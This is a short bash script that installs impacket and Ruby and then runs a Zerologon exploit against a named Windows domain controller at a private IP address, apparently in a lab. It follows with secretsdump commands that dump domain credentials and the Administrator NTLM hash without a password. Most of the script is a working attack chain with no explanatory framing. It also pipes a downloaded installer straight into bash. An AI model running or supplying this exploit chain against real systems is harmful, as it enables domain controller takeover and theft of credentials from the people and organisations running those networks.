#!/bin/bash

# Install pip (without sudo)
wget https://bootstrap.pypa.io/get-pip.py
python3 get-pip.py --user
PATH=$PATH:$HOME/.local/bin

pip3 install impacket

# Install ruby

curl -fsSL https://github.com/rbenv/rbenv-installer/raw/HEAD/bin/rbenv-installer | bash
PATH=$PATH:$HOME/.rbenv/bin
rbenv install 3.1.2


# Reset admin password
python3 zerologon.py -do EXPLOIT -target EC2AMAZ-8SFMEJU -ip 192.168.1.2
python3 secretsdump.py -just-dc -no-pass EC2AMAZ-8SFMEJU\$@192.168.1.2

secretsdump.py -just-dc-user Administrator -just-dc-ntlm -no-pass EC2AMAZ-8SFMEJU\$@192.168.1.2
